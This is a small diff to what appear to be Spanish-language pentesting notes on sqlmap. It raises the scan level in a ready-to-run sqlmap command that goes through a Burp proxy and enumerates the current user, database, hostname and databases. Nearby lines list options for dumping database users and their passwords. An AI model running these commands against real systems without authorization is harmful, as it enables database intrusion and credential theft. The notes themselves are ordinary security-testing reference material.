@@ -216,4 +216,4 @@ Importante --tor y --check-tor
     --users muestra los usuarios de la base de datos
     --passwords muestra las contraseñas de los usuarios anteriores
 
-sqlmap.py -r TXT-PETICION --proxy http://127.0.0.1:8080 (Por Burp) --level=3 --risk=3  --thread=10 [--dbms="Microsoft SQL Server"] --current-user --current-db --hostname --dbs
+sqlmap.py -r TXT-PETICION --proxy http://127.0.0.1:8080 (Por Burp) --level=5 --risk=3  --thread=10 [--dbms="Microsoft SQL Server"] --current-user --current-db --hostname --dbs
